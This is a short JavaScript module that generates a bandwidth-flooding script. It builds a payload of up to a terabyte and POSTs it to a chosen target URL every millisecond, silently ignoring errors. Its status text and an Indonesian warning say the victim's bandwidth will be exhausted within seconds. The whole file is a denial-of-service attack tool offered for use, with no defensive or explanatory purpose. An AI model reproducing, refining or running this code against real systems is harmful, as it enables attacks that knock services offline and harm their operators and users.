function bandGenerator(target, size) {
  const sizeBytes = {
    '1GB': 1073741824,
    '10GB': 10737418240,
    '100GB': 107374182400,
    '1TB': 1099511627776
  };
  
  const bandScript = `
    const data = new Array(${sizeBytes[size] || 999999999}).fill('X').join('');
    setInterval(()=>{
      fetch('${target}', {
        method: 'POST',
        body: data,
        headers: {'Content-Type': 'application/octet-stream'}
      }).catch(()=>{});
    }, 1);
  `;
  
  return {
    status: '🌊 BAND GENERATOR ACTIVE',
    target: target,
    bandwidth: size,
    script: bandScript,
    warning: 'BANDWIDTH KORBAN AKAN HABIS DALAM 5 DETIK!'
  };
}

module.exports = { bandGenerator };
